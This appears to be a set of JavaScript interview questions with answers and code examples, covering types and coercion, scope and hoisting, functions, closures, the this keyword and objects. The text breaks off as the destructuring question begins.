## Types, values and coercion

### js01 | What are the data types in JavaScript?

JavaScript has **8 types**: seven **primitives** and one **object** type.

| Primitive | Example |
|---|---|
| `string` | `"hi"` |
| `number` | `42`, `3.14`, `NaN`, `Infinity` (one 64-bit float type) |
| `bigint` | `9007199254740993n` |
| `boolean` | `true` |
| `undefined` | a declared variable with no value |
| `null` | an intentional "no value" |
| `symbol` | `Symbol("id")`, a unique value |

Everything else is an **object**: plain objects, arrays, functions, dates, maps, sets, regexes.

Key differences:
- Primitives are **immutable**: `str.toUpperCase()` returns a new string, it never changes `str`.
- Primitives are compared **by value**, objects **by reference**.

```js
"a" === "a";        // true
({}) === ({});      // false: two different objects
const a = [1]; const b = a;
a === b;            // true: same reference
```

JavaScript is **dynamically typed**: the type belongs to the value, not the variable, so one variable can hold a number and later a string.

### js02 | What is the difference between pass by value and pass by reference in JavaScript?

JavaScript always **passes by value**. For objects, though, the value being copied *is a reference*, often called "pass by sharing".

```js
function change(n, obj) {
  n = 100;           // changes the local copy only
  obj.name = "B";    // mutates the shared object -> visible outside
  obj = { name: "C" }; // rebinds the local variable only -> NOT visible outside
}
let x = 1, o = { name: "A" };
change(x, o);
console.log(x, o.name); // 1 "B"
```

- Primitives: the function gets a copy, so the caller never sees a change.
- Objects: the function gets a copy of the **reference**. Mutating through it is visible to the caller; reassigning the parameter is not.

The same applies to assignment: `const b = a` (where `a` is an object) shares one object, it doesn't copy it.

### js03 | What is the difference between null, undefined and undeclared?

- **undefined**: declared but not assigned; also what a function returns with no `return`, a missing argument, or a missing property.
- **null**: assigned on purpose to mean "no value / empty".
- **undeclared**: never declared at all. Reading it throws `ReferenceError`.

```js
let a;            // undefined
let b = null;     // null
console.log(c);   // ReferenceError: c is not defined

typeof a;         // "undefined"
typeof b;         // "object"  (a historical bug)
typeof c;         // "undefined" (typeof does not throw for undeclared names)

null == undefined;  // true  (loose equality treats them as equal)
null === undefined; // false
```

Rule of thumb: let the engine produce `undefined`, use `null` yourself when you mean "empty".

### js04 | How does typeof work, and what are its quirks?

`typeof` returns a string naming the type:

```js
typeof "x";          // "string"
typeof 1;            // "number"
typeof 1n;           // "bigint"
typeof true;         // "boolean"
typeof undefined;    // "undefined"
typeof Symbol();     // "symbol"
typeof function(){}; // "function"
typeof {};           // "object"
typeof [];           // "object"  <- quirk
typeof null;         // "object"  <- famous bug from JS 1.0, never fixed
typeof NaN;          // "number"  <- NaN is a number value
```

Better checks:
- Array: `Array.isArray(v)`
- null: `v === null`
- Plain type of an object: `Object.prototype.toString.call(v)` → `"[object Date]"`
- Instance of a class: `v instanceof Date` (walks the prototype chain)

### js05 | What is the difference between == and ===?

- `===` (**strict equality**): true only if the type and value match. No conversion.
- `==` (**loose equality**): converts the operands to a common type first (**type coercion**), then compares.

```js
0 == "0";            // true   (string -> number)
0 == "";             // true   ("" -> 0)
"0" == "";           // false  (both strings, compared as strings)
false == "0";        // true   (false -> 0, "0" -> 0)
null == undefined;   // true   (special rule)
null == 0;           // false  (null only loosely equals undefined)
NaN == NaN;          // false  (NaN equals nothing)
[1] == 1;            // true   ([1] -> "1" -> 1)
```

Coercion rules for `==`, roughly: `null`/`undefined` only equal each other; a boolean becomes a number; when a string meets a number, the string becomes a number; an object becomes a primitive (via `valueOf` / `toString`).

**Use `===` always.** The one common exception is `x == null`, which checks for both `null` and `undefined` at once.

### js06 | What are truthy and falsy values?

In a boolean context (`if`, `&&`, `||`, `!`) every value converts to `true` or `false`.

There are exactly **8 falsy values**:
`false`, `0`, `-0`, `0n`, `""`, `null`, `undefined`, `NaN`.

**Everything else is truthy**, including some surprises:

```js
Boolean("0");     // true  (non-empty string)
Boolean("false"); // true
Boolean([]);      // true  (empty array is an object)
Boolean({});      // true
```

`!!value` is a common shorthand for converting to a boolean: `!!"hi" === true`.

Gotcha: `if (count)` is false for `0`. When `0` is a valid value, check explicitly: `if (count !== undefined)`, or use `??`.

### js07 | What is NaN, and what is the difference between isNaN and Number.isNaN?

`NaN` ("Not a Number") is a **number** value that represents a failed numeric operation: `Number("abc")`, `0 / 0`, `Math.sqrt(-1)`.

It is the **only value not equal to itself**:

```js
NaN === NaN;          // false
[NaN].includes(NaN);  // true  (includes uses SameValueZero)
[NaN].indexOf(NaN);   // -1    (indexOf uses ===)
```

- **`isNaN(v)`** (global) first **converts** `v` to a number: `isNaN("hello")` → `true`, which is misleading.
- **`Number.isNaN(v)`** returns true only if `v` really is the value `NaN`: `Number.isNaN("hello")` → `false`.

Prefer `Number.isNaN` (or `Object.is(v, NaN)`).

### js08 | What does 1 + 2 + "3" evaluate to, and how does + coerce?

`"33"`. `+` is evaluated left to right:

```js
1 + 2 + "3";   // (1 + 2) = 3, then 3 + "3" = "33"
"1" + 2 + 3;   // "12" + 3 = "123"
```

Rules for `+`:
- If **either** operand is a string (after converting objects to primitives), it **concatenates**.
- Otherwise it **adds** numbers.

The other arithmetic operators (`-`, `*`, `/`) always convert to numbers:

```js
"5" - 2;    // 3
"5" * "2";  // 10
[] + [];    // ""          (both become "")
[] + {};    // "[object Object]"
true + 1;   // 2
```

Unary `+` converts to a number: `+"42"` → `42`, `+""` → `0`, `+"abc"` → `NaN`.

### js09 | Why is 0.1 + 0.2 !== 0.3?

All JS numbers are **IEEE 754 double-precision floats**. Some decimal fractions, like 0.1, have no exact binary form, so tiny rounding errors appear:

```js
0.1 + 0.2;            // 0.30000000000000004
0.1 + 0.2 === 0.3;    // false
```

Fixes:
- Compare with a tolerance: `Math.abs(a - b) < Number.EPSILON`
- For money, store **integers in the smallest unit** (paise/cents): `1999` instead of `19.99`
- Round for display: `(0.1 + 0.2).toFixed(2)` → `"0.30"`

Related: integers are only exact up to `Number.MAX_SAFE_INTEGER` (2^53 − 1). Beyond that, use `BigInt` (`123n`), for example for large IDs.

### js10 | What are the nullish coalescing (??) and optional chaining (?.) operators?

**`??`** returns the right side only when the left is `null` or `undefined`. `||` falls back on **any** falsy value, which is often a bug:

```js
const count = 0;
count || 10;   // 10  <- wrong if 0 is a valid value
count ?? 10;   // 0   <- correct
```

**`?.`** stops and returns `undefined` if the value before it is `null`/`undefined`, instead of throwing:

```js
const user = { profile: null };
user.profile.name;        // TypeError
user.profile?.name;       // undefined
user.getName?.();         // calls only if getName exists
arr?.[0];                 // safe index access
```

Together: `const city = user?.address?.city ?? "Unknown";`

Logical assignment operators combine these: `a ||= b`, `a &&= b`, `a ??= b` (assign only if `a` is falsy / truthy / nullish).

### js11 | How does short-circuit evaluation work with && and ||?

`&&` and `||` return **one of the operands**, not necessarily a boolean, and stop evaluating as soon as the result is known.

- `a || b`: returns `a` if `a` is truthy, else `b`.
- `a && b`: returns `a` if `a` is falsy, else `b`.

```js
"" || "default";     // "default"
"x" || "default";    // "x"
user && user.name;   // user.name if user exists, else user (e.g. null)
isLoggedIn && showDashboard();  // calls only if true
```

The right side is **not evaluated** if not needed, so `a || expensive()` skips `expensive()` when `a` is truthy.

### js12 | How can "abc".length work if a string is a primitive?

Through **autoboxing** (wrapper objects). When you access a property on a primitive, the engine temporarily wraps it in its object counterpart (`String`, `Number`, `Boolean`, `Symbol`, `BigInt`), looks up the property on that wrapper's prototype, then throws the wrapper away.

```js
"abc".length;          // 3
"abc".toUpperCase();   // "ABC" via String.prototype
const s = "abc";
s.custom = 1;          // set on a temporary wrapper...
s.custom;              // undefined (that wrapper is gone)
```

Never create wrappers yourself with `new`:

```js
typeof new String("a");   // "object"
new Boolean(false) ? 1 : 2; // 1, because objects are always truthy
```

## Variables, scope and hoisting

### js13 | What are the differences between var, let and const?

| | `var` | `let` | `const` |
|---|---|---|---|
| Scope | function | block `{}` | block `{}` |
| Hoisted | yes, initialised to `undefined` | yes, but uninitialised (TDZ) | yes, but uninitialised (TDZ) |
| Redeclare in the same scope | allowed | error | error |
| Reassign | allowed | allowed | **not allowed** |
| Creates a property on `window` at top level | yes | no | no |

```js
if (true) { var a = 1; let b = 2; }
console.log(a); // 1  (var leaks out of the block)
console.log(b); // ReferenceError

console.log(c); // undefined (hoisted var)
var c = 3;

const d = 1;
d = 2;          // TypeError: Assignment to constant variable
```

Modern style: **`const` by default, `let` when you need to reassign, never `var`.**

### js14 | Does const make a value immutable?

No. `const` makes the **binding** constant: you can't point the variable at another value. The object it points to can still be changed.

```js
const user = { name: "A" };
user.name = "B";     // fine, the object is mutated
user = {};           // TypeError, the binding can't change

const arr = [1, 2];
arr.push(3);         // fine
```

To make the **object** immutable, use `Object.freeze`. It's **shallow**:

```js
const cfg = Object.freeze({ port: 80, db: { host: "x" } });
cfg.port = 90;        // silently ignored (TypeError in strict mode)
cfg.db.host = "y";    // works! nested objects are not frozen
```

A deep freeze has to recurse through every nested object yourself.

### js15 | What is scope, and what are global, function and block scope?

**Scope** decides where a variable can be accessed.

- **Global scope**: declared outside every function or block. Visible everywhere.
- **Function scope**: declared inside a function (`var`, `let`, `const`). Visible only in that function.
- **Block scope**: `let`/`const` inside `{ }` (if, for, plain blocks). Visible only in that block. `var` ignores blocks.
- **Module scope**: top-level variables in an ES module are private to that module.

```js
const g = "global";
function f() {
  const fn = "function";
  if (true) {
    const blk = "block";
    var v = "var";       // function-scoped despite being inside the if
  }
  console.log(v);        // "var"
  console.log(blk);      // ReferenceError
}
```

JavaScript uses **lexical (static) scoping**: what a function can see is decided by **where it is written** in the code, not where it is called from.

### js16 | What is the scope chain, and what is variable shadowing?

When a variable is used, the engine looks for it in the current scope, then the enclosing scope, and so on out to global. This lookup path is the **scope chain**. If the name isn't found anywhere, you get a `ReferenceError`.

```js
const a = 1;
function outer() {
  const b = 2;
  function inner() {
    const c = 3;
    console.log(a + b + c); // finds c locally, b in outer, a in global
  }
  inner();
}
```

**Shadowing**: an inner variable with the same name hides the outer one inside its scope.

```js
let x = "outer";
{
  let x = "inner";   // shadows
  console.log(x);    // "inner"
}
console.log(x);      // "outer"
```

**Illegal shadowing**: you can't shadow a `let` with a `var` in an inner block, because `var` would leak into the same function scope:

```js
let y = 1;
{ var y = 2; }  // SyntaxError: Identifier 'y' has already been declared
```

### js17 | What is hoisting?

Before code runs, the engine sets up memory for every declaration in a scope. This makes declarations behave as if they were "moved to the top". Only the **declaration** is hoisted, not the initialisation.

```js
console.log(a);   // undefined   (var: hoisted and initialised to undefined)
var a = 5;

sayHi();          // "hi"        (function declaration: fully hoisted with its body)
function sayHi() { console.log("hi"); }

console.log(b);   // ReferenceError (let/const: hoisted but not initialised, TDZ)
let b = 1;

greet();          // TypeError: greet is not a function
var greet = function () {};  // only `var greet` is hoisted (as undefined)

new Foo();        // ReferenceError: classes are in the TDZ too
class Foo {}
```

Summary: `var` → `undefined`; function declarations → usable before their line; `let`/`const`/`class` → TDZ error.

### js18 | What is the Temporal Dead Zone (TDZ)?

The TDZ is the stretch between the **start of a scope** and the **line where a `let`/`const`/`class` is declared**. Touching the variable in that stretch throws `ReferenceError`.

```js
{
  // TDZ for `count` starts here
  console.log(count);   // ReferenceError: Cannot access 'count' before initialization
  let count = 0;        // TDZ ends here
}
```

Why it exists: it turns "used before declared" into a clear error rather than `var`'s silent `undefined`.

A subtle case: the TDZ is about **time**, not position.

```js
function show() { return value; }  // fine to *write* this
let value = 1;
show(); // 1, because by the time show() runs, value is initialised
```

### js19 | What is the difference between a function declaration and a function expression?

```js
// Declaration: hoisted with its body, callable before this line
function add(a, b) { return a + b; }

// Expression: a function value assigned to a variable
const sub = function (a, b) { return a - b; };
const mul = (a, b) => a * b;   // arrow function expression
```

| | Declaration | Expression |
|---|---|---|
| Hoisting | the whole function | only the variable (TDZ for `let`/`const`, `undefined` for `var`) |
| Name | required | optional (`const f = function g() {}`, where `g` is visible only inside) |
| Use | top-level helpers | callbacks, conditional definitions, IIFEs |

```js
square(2);                   // works
function square(n) { return n * n; }

cube(2);                     // ReferenceError (TDZ)
const cube = (n) => n ** 3;
```

### js20 | What is an execution context?

An **execution context** is the environment a piece of code runs in. There are two main kinds:
- **Global execution context**: created once when the script starts. It sets up the global object (`window` / `globalThis`) and `this`.
- **Function execution context**: created **every time a function is called**.

Each context is built in two phases:
1. **Creation (memory) phase**: the engine scans the code and sets up memory. `var` → `undefined`, function declarations → their full body, `let`/`const` → uninitialised (TDZ). It also works out `this` and the link to the outer (lexical) environment.
2. **Execution phase**: the code runs line by line, assigning values and calling functions.

```js
var x = 10;
function f() { var y = 20; return x + y; }
f();
// 1. Global context created: x = undefined, f = <function>
// 2. Executes: x = 10, then f() pushes a NEW function context: y = undefined -> 20
// 3. f returns, its context is popped off the call stack
```

This model is what explains hoisting, closures and the scope chain.

### js21 | What is the call stack?

The **call stack** is a LIFO stack of execution contexts. Calling a function **pushes** a frame; returning **pops** it. JavaScript has **one** call stack, which is why it runs one thing at a time.

```js
function a() { b(); }
function b() { c(); }
function c() { console.trace(); }
a();
// Stack while in c: c -> b -> a -> (global)
```

- Infinite recursion fills it: `RangeError: Maximum call stack size exceeded`.
- A long synchronous task keeps the stack busy, so nothing else (clicks, timers, rendering) can run. That's why heavy work blocks the UI.
- Async callbacks (timers, promises) only run when the stack is **empty**. See the event loop.

### js22 | What is strict mode?

`"use strict"` opts into a stricter set of rules that turns silent mistakes into errors. **ES modules and class bodies are strict automatically.**

```js
"use strict";
x = 10;                 // ReferenceError (no accidental globals)
function f() { return this; }
f();                    // undefined (not window)
Object.freeze(o); o.a = 1; // TypeError instead of silently ignoring
function g(a, a) {}     // SyntaxError: duplicate parameter names
delete Object.prototype; // TypeError
```

Main changes:
- No implicit globals.
- `this` is `undefined` in plain function calls.
- Writes to read-only or frozen properties throw.
- Removes `with`; reserves future keywords.

It makes code safer and lets engines optimise better.

### js23 | Why are global variables a problem, and what is globalThis?

Problems with globals:
- **Name collisions**: any script or library can overwrite them.
- **Hidden coupling**: any code can change them, which makes bugs hard to trace.
- **Memory**: they live for the whole page, so they're never garbage collected.
- **Testing**: shared state leaks between tests.

Avoid them with modules (each file has its own scope), closures, or one namespace object.

**`globalThis`** (ES2020) is the standard way to reach the global object in any environment:
- Browser: `window` (also `self`, `frames`)
- Node.js: `global`
- Web workers: `self`

```js
globalThis.setTimeout === setTimeout; // true everywhere
```

## Functions

### js24 | What are first-class and higher-order functions?

**First-class functions**: functions are values. You can store them in variables, pass them as arguments, return them, and put them in objects or arrays.

**Higher-order function (HOF)**: a function that **takes** a function as an argument or **returns** one.

```js
// takes a function
[1, 2, 3].map((n) => n * 2);          // [2, 4, 6]

// returns a function
function multiplier(factor) {
  return (n) => n * factor;
}
const triple = multiplier(3);
triple(5);  // 15
```

Built-in HOFs: `map`, `filter`, `reduce`, `forEach`, `sort`, `setTimeout`, `addEventListener`, `Promise.then`.

Why they matter: they let you separate **what** to do from **how** to loop, and they make closures, currying, middleware and React hooks possible.

### js25 | How are arrow functions different from regular functions?

```js
const add = (a, b) => a + b;          // implicit return
const toObj = (id) => ({ id });       // wrap an object literal in ()
```

| | Regular function | Arrow function |
|---|---|---|
| `this` | set by **how it's called** | **inherited** from the surrounding scope (lexical) |
| `arguments` | yes | no (use `...rest`) |
| Usable with `new` | yes | no (TypeError) |
| `prototype` property | yes | no |
| Good as an object method | yes | usually no |

The key difference is `this`:

```js
const timer = {
  seconds: 0,
  start() {
    setInterval(() => {
      this.seconds++;     // arrow: `this` is timer
    }, 1000);
  },
};

const obj = {
  name: "A",
  hi: () => console.log(this.name),  // `this` is NOT obj (it's outer this)
};
```

Use arrows for callbacks; use regular functions or method shorthand for object methods and constructors.

### js26 | What is a callback function?

A **callback** is a function passed to another function, to be called later: when work finishes, or once per item.

```js
// synchronous callback
[3, 1, 2].sort((a, b) => a - b);

// asynchronous callback
setTimeout(() => console.log("later"), 1000);
button.addEventListener("click", () => console.log("clicked"));

// Node-style "error-first" callback
fs.readFile("a.txt", "utf8", (err, data) => {
  if (err) return console.error(err);
  console.log(data);
});
```

Callbacks are how JS handled async before promises. Their problems are **callback hell** (deep nesting) and **inversion of control** (you trust the other code to call your callback exactly once). Promises fix both.

### js27 | What is an IIFE, and why doesn't `function foo(){}()` work?

An **IIFE** (Immediately Invoked Function Expression) runs as soon as it's defined:

```js
(function () {
  const secret = 42;      // private to this function
  console.log("runs once");
})();

(() => { /* arrow IIFE */ })();
```

**Why `function foo(){}()` fails**: a line that starts with `function` is parsed as a **declaration**, and a declaration can't be called in place. The trailing `()` is then a syntax error. Wrapping it in parentheses (or starting with `!`, `+` or `void`) makes the parser read it as an **expression**, which can be called.

Uses:
- Private scope before ES modules existed (the **module pattern**).
- Running async code at the top level: `(async () => { await init(); })();`
- Capturing a value at a point in time.

### js28 | What are default parameters, rest parameters and the arguments object?

```js
// Default parameters: used when the argument is undefined (not null)
function greet(name = "Guest", greeting = `Hi ${name}`) {
  return greeting;
}
greet();            // "Hi Guest"
greet(undefined);   // "Hi Guest"
greet(null);        // "Hi null"

// Rest parameters: collect the remaining args into a REAL array
function sum(first, ...rest) {
  return rest.reduce((a, b) => a + b, first);
}
sum(1, 2, 3); // 6
```

`arguments` (old style, regular functions only):
- **array-like** (has `length` and indexes), **not** a real array, so no `map`/`filter`
- holds **all** arguments
- doesn't exist in arrow functions

```js
function old() {
  return Array.from(arguments).join("-");
}
```

Prefer rest parameters: a real array, explicit, and they work in arrows. A rest parameter must come last.

### js29 | What is the difference between the spread operator and rest parameters?

Same `...` syntax, opposite jobs:
- **Spread** *expands* an iterable or object into individual elements or properties.
- **Rest** *collects* several elements into one array or object.

```js
// SPREAD
const a = [1, 2], b = [3];
const merged = [...a, ...b];          // [1, 2, 3]
Math.max(...a);                       // 2
const copy = { ...user, age: 30 };    // shallow copy + override

// REST
function log(level, ...msgs) {}        // in parameters
const [first, ...others] = [1, 2, 3];  // others = [2, 3]
const { id, ...withoutId } = user;     // remove a key immutably
```

Rule: `...` on the **receiving** side (parameters, destructuring) is rest; on the **giving** side (calls, literals) it's spread.

Spread copies are **shallow**.

### js30 | What is a pure function, and what are side effects?

A **pure function**:
1. always returns the **same output for the same input**, and
2. has **no side effects** (it changes nothing outside itself).

```js
// pure
const add = (a, b) => a + b;

// impure: depends on and changes outer state
let total = 0;
const addToTotal = (n) => (total += n);

// impure: non-deterministic
const now = () => Date.now();
```

**Side effects**: changing external variables or arguments, DOM updates, network or disk I/O, `console.log`, timers, `Math.random()`.

Why it matters:
- Easy to test and reason about; safe to memoise; supports **referential transparency** (a call can be replaced by its result).
- React expects components and reducers to be pure; side effects belong in `useEffect` or event handlers.

Apps need side effects. The goal is to **isolate** them at the edges.

### js31 | What are currying and partial application?

**Currying** turns `f(a, b, c)` into `f(a)(b)(c)`: a chain of functions that take **one argument each**.

**Partial application** fixes **some** arguments now and returns a function that takes the rest.

```js
// curried
const add = (a) => (b) => (c) => a + b + c;
add(1)(2)(3); // 6

// partial application with bind
function volume(l, w, h) { return l * w * h; }
const baseTen = volume.bind(null, 10);   // l is fixed
baseTen(2, 3); // 60

// generic curry helper (a classic interview question)
function curry(fn) {
  return function curried(...args) {
    if (args.length >= fn.length) return fn.apply(this, args);
    return (...next) => curried.apply(this, [...args, ...next]);
  };
}
const cv = curry(volume);
cv(2)(3)(4); cv(2, 3)(4); cv(2)(3, 4); // all 24
```

Uses: reusable, preconfigured functions (`const logError = log("error")`), and function composition.

### js32 | What are compose and pipe?

Both combine small functions into one:
- **`pipe(f, g, h)(x)`** = `h(g(f(x)))`, applied **left to right** (reads like steps).
- **`compose(f, g, h)(x)`** = `f(g(h(x)))`, applied **right to left** (the maths convention).

```js
const pipe = (...fns) => (x) => fns.reduce((acc, fn) => fn(acc), x);
const compose = (...fns) => (x) => fns.reduceRight((acc, fn) => fn(acc), x);

const trim = (s) => s.trim();
const lower = (s) => s.toLowerCase();
const slug = (s) => s.replace(/\s+/g, "-");

const toSlug = pipe(trim, lower, slug);
toSlug("  Hello World  "); // "hello-world"
```

This is the same idea as Express middleware chains and Redux enhancers.

### js33 | What is memoization? Implement it.

**Memoization** caches a function's results by its arguments, so repeat calls with the same input return straight away. It only works for **pure** functions.

```js
function memoize(fn) {
  const cache = new Map();
  return function (...args) {
    const key = JSON.stringify(args);      // simple key; fine for primitives
    if (cache.has(key)) return cache.get(key);
    const result = fn.apply(this, args);
    cache.set(key, result);
    return result;
  };
}

const slowSquare = (n) => { for (let i = 0; i < 1e8; i++); return n * n; };
const fastSquare = memoize(slowSquare);
fastSquare(9); // slow the first time
fastSquare(9); // instant from the cache

// memoized recursion: fibonacci goes from O(2^n) to O(n)
const fib = memoize((n) => (n < 2 ? n : fib(n - 1) + fib(n - 2)));
```

Trade-offs: it uses memory (the cache grows without bound, so consider an LRU), and `JSON.stringify` keys don't work for functions or circular objects. In React, `useMemo`/`React.memo` apply the same idea to rendering.

### js34 | What are debouncing and throttling? Implement both.

Both limit how often a function runs during a burst of events (typing, scrolling, resizing).

- **Debounce**: run only after events have **stopped** for `delay` ms. Example: search-as-you-type, so you fire one request when the user pauses.
- **Throttle**: run **at most once every** `interval` ms while events keep coming. Example: scroll position tracking, infinite scroll.

```js
function debounce(fn, delay) {
  let timer;
  return function (...args) {
    clearTimeout(timer);                       // every new call resets the wait
    timer = setTimeout(() => fn.apply(this, args), delay);
  };
}

function throttle(fn, interval) {
  let last = 0;
  return function (...args) {
    const now = Date.now();
    if (now - last >= interval) {
      last = now;
      fn.apply(this, args);
    }
  };
}

input.addEventListener("input", debounce((e) => search(e.target.value), 300));
window.addEventListener("scroll", throttle(updatePosition, 100));
```

Both rely on **closures** to keep `timer`/`last` between calls.

## Closures

### js35 | What is a closure?

A **closure** is a function **together with the variables from the scope it was created in**. The function keeps access to those variables even after the outer function has returned.

```js
function makeCounter() {
  let count = 0;               // lives on after makeCounter returns
  return function () {
    count++;
    return count;
  };
}
const c1 = makeCounter();
c1(); // 1
c1(); // 2
const c2 = makeCounter();
c2(); // 1, a separate closure with its own `count`
```

How it works: every function stores a hidden reference to its **lexical environment** (the variables around it when it was created). As long as the function is reachable, that environment can't be garbage collected.

Closures capture **variables, not values**. If the variable changes later, the closure sees the new value.

Every JS function is technically a closure. The word matters when a function **outlives** the scope it was defined in.

### js36 | What does this print, and why: setTimeout inside a for loop with var vs let?

```js
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 0);
}
// 3 3 3

for (let j = 0; j < 3; j++) {
  setTimeout(() => console.log(j), 0);
}
// 0 1 2
```

- With `var`, there is **one** `i` shared by the whole function. The callbacks run after the loop ends, when `i` is already 3, and all three closures point at that same variable.
- With `let`, the loop creates a **new binding of `j` for every iteration**, so each callback closes over its own copy.

Pre-ES6 fix with an IIFE:

```js
for (var i = 0; i < 3; i++) {
  (function (k) { setTimeout(() => console.log(k), 0); })(i);
}
```

This tests closures, scope and the event loop at once.

### js37 | What are practical uses of closures?

1. **Private state / encapsulation** (the module pattern):
```js
function createAccount(initial) {
  let balance = initial;              // not reachable from outside
  return {
    deposit: (amt) => (balance += amt),
    getBalance: () => balance,
  };
}
const acc = createAccount(100);
acc.deposit(50); acc.getBalance(); // 150; `balance` itself is hidden
```

2. **Function factories**: `const double = multiplier(2)`.
3. **Run once**:
```js
function once(fn) {
  let done = false, result;
  return (...args) => (done ? result : ((done = true), (result = fn(...args))));
}
```
4. **Keeping state between calls**: debounce/throttle timers, memoization caches.
5. **Callbacks and event handlers** that need data from when they were set up.
6. **React hooks**: every render's handlers close over that render's props and state.

### js38 | What are the pitfalls of closures?

1. **Memory retention**: a closure keeps its whole outer scope alive. A long-lived closure (an event listener, an interval, a cache) that captured a large object prevents it from being garbage collected.
```js
function attach() {
  const bigData = new Array(1e6).fill("x");
  button.addEventListener("click", () => console.log(bigData.length));
  // bigData lives as long as the listener does: remove the listener when done
}
```
2. **Stale values**: a closure captures the variable as it was in **that** scope. In React this shows up as "stale closures": an interval set up once keeps reading the first render's state.
```js
useEffect(() => {
  const id = setInterval(() => setCount(count + 1), 1000); // count is always 0
  return () => clearInterval(id);
}, []); // fix: setCount(c => c + 1)
```
3. **Loops with `var`**: every callback shares one variable (see the setTimeout loop question).
4. **Performance**: creating new closures in hot loops costs memory. It's rarely an issue.

## The this keyword

### js39 | How is `this` determined in JavaScript?

`this` is set by **how a function is called**, not where it is defined (except for arrow functions). Check these rules in order of precedence:

1. **`new` binding**: `new Foo()`, so `this` is the newly created object.
2. **Explicit binding**: `fn.call(obj)`, `fn.apply(obj)`, `fn.bind(obj)`, so `this` is `obj`.
3. **Implicit binding**: `obj.method()`, so `this` is the object **before the dot**.
4. **Default binding**: a plain `fn()`, so `this` is `undefined` in strict mode, or the global object in sloppy mode.

**Arrow functions** ignore all of these: they take `this` from the enclosing scope.

```js
function show() { return this?.name; }
const a = { name: "A", show };
const b = { name: "B" };

a.show();             // "A"   implicit
show.call(b);         // "B"   explicit
new (function () { this.name = "N"; })().name; // "N"  new
show();               // undefined (strict) default

const outer = { name: "O", f() { return (() => this.name)(); } };
outer.f();            // "O"   arrow takes f's this
```

Other cases: in a DOM event handler (a regular function), `this` is the element; at a module's top level, `this` is `undefined`.

### js40 | What is the difference between call, apply and bind?

All three set `this` explicitly.

| | Invokes now? | Arguments | Returns |
|---|---|---|---|
| `call` | yes | listed one by one: `fn.call(obj, a, b)` | the function's result |
| `apply` | yes | as an array: `fn.apply(obj, [a, b])` | the function's result |
| `bind` | **no** | can pre-fill some: `fn.bind(obj, a)` | a **new function** with `this` locked |

```js
function intro(greeting, punct) {
  return `${greeting}, I'm ${this.name}${punct}`;
}
const user = { name: "Shubam" };

intro.call(user, "Hi", "!");        // "Hi, I'm Shubam!"
intro.apply(user, ["Hello", "."]);  // "Hello, I'm Shubam."
const hey = intro.bind(user, "Hey");
hey("?");                           // "Hey, I'm Shubam?"
```

Mnemonic: **a**pply takes an **a**rray. `bind` is for later: callbacks, event handlers, and partial application. A bound function's `this` can't be re-bound, though `new` still overrides it.

### js41 | Implement Function.prototype.bind.

```js
Function.prototype.myBind = function (context, ...boundArgs) {
  const fn = this;                       // the original function
  return function (...callArgs) {
    return fn.apply(context, [...boundArgs, ...callArgs]);
  };
};

function greet(greeting, name) { return `${greeting} ${name}, from ${this.city}`; }
const g = greet.myBind({ city: "Pune" }, "Hello");
g("Shubam"); // "Hello Shubam, from Pune"
```

Points interviewers look for:
- `this` inside `myBind` is the function being bound.
- **Partial application**: merge the bound args with the args given at call time.
- Bonus: when the result is called with `new`, the real `bind` ignores the bound context. Handle it with `if (new.target) return new fn(...boundArgs, ...callArgs);`.

Same idea for call without using call/apply: set the function as a temporary property on the context (`context[sym] = fn; context[sym](...args)`), then delete it.

### js42 | Why does `this` get "lost" in callbacks, and how do you fix it?

Passing a method as a callback **detaches it from its object**. It's later called as a plain function, so the default binding applies.

```js
const counter = {
  count: 0,
  inc() { this.count++; },
};
setTimeout(counter.inc, 0);          // `this` is undefined/window, so it fails
button.addEventListener("click", counter.inc); // `this` is the button
```

Fixes:
```js
setTimeout(() => counter.inc(), 0);       // 1. wrap in an arrow
setTimeout(counter.inc.bind(counter), 0); // 2. bind

class Counter {
  count = 0;
  inc = () => { this.count++; };          // 3. arrow class field: bound per instance
}
```

This is also why old React class components needed `this.handleClick = this.handleClick.bind(this)` in the constructor.

## Objects

### js43 | What are the ways to create objects in JavaScript?

```js
// 1. Object literal (most common)
const a = { name: "A", greet() { return "hi"; } };

// 2. Constructor function + new
function Person(name) { this.name = name; }
const b = new Person("B");

// 3. ES6 class (syntax over constructor functions)
class User { constructor(name) { this.name = name; } }
const c = new User("C");

// 4. Object.create: choose the prototype explicitly
const proto = { greet() { return `hi ${this.name}`; } };
const d = Object.create(proto);
d.name = "D";
const bare = Object.create(null); // no prototype at all, a pure dictionary

// 5. Factory function (no `new`, no `this`)
const makeUser = (name) => ({ name, greet: () => `hi ${name}` });

// 6. Object.assign / spread from existing objects
const e = { ...a, name: "E" };
```

Literals for data, classes or factories for many instances with behaviour, `Object.create` for explicit prototype control.

### js44 | What is the difference between dot and bracket notation?

```js
const user = { name: "A", "first-name": "B", 1: "one" };

user.name;            // dot: identifier must be a valid, fixed name
user["first-name"];   // bracket: any string, including hyphens and spaces
user[1];              // numeric keys (converted to the string "1")

const key = "name";
user[key];            // bracket: dynamic key from a variable
user.key;             // undefined, looks for a property literally called "key"
```

Use **bracket notation** when the key is dynamic, isn't a valid identifier, or is a Symbol.

**Computed property names** and shorthand in literals:
```js
const field = "email";
const name = "A";
const obj = { name, [field]: "a@b.com", [`${field}Verified`]: true };
// { name: "A", email: "a@b.com", emailVerified: true }
```

### js45 | How do you check whether an object has a property?

```js
const user = { name: "A", age: undefined };

"name" in user;                    // true  (also checks the prototype chain)
"toString" in user;                // true  (inherited!)

Object.hasOwn(user, "name");       // true  own properties only (ES2022, preferred)
user.hasOwnProperty("name");       // true  (older; breaks on Object.create(null))

user.age !== undefined;            // false, even though the key EXISTS
```

- Use **`Object.hasOwn`** for "is this key really on the object".
- Use **`in`** when inherited properties count too.
- Don't compare with `undefined` when the value itself can be `undefined`.

Empty-object check: `Object.keys(obj).length === 0`.

### js46 | What is the difference between for...in and for...of?

- **`for...in`** iterates over **keys** (enumerable string property names), **including inherited** ones. It's for objects.
- **`for...of`** iterates over **values** of an **iterable** (arrays, strings, Maps, Sets, generators). Plain objects aren't iterable.

```js
const arr = ["a", "b"];
for (const i in arr) console.log(i);   // "0", "1"  (string keys)
for (const v of arr) console.log(v);   // "a", "b"

const obj = { x: 1, y: 2 };
for (const k in obj) console.log(k);   // "x", "y"
for (const v of obj) {}                // TypeError: obj is not iterable

// the modern way to loop over an object
for (const [k, v] of Object.entries(obj)) console.log(k, v);
```

Avoid `for...in` on arrays: the keys are strings, the order isn't guaranteed for every case, and it picks up inherited enumerable properties.

`Object.keys/values/entries` return **own** enumerable properties only.

### js47 | What is destructuring?

Destructuring unpacks values from arrays, or properties from objects, into variables.

```js
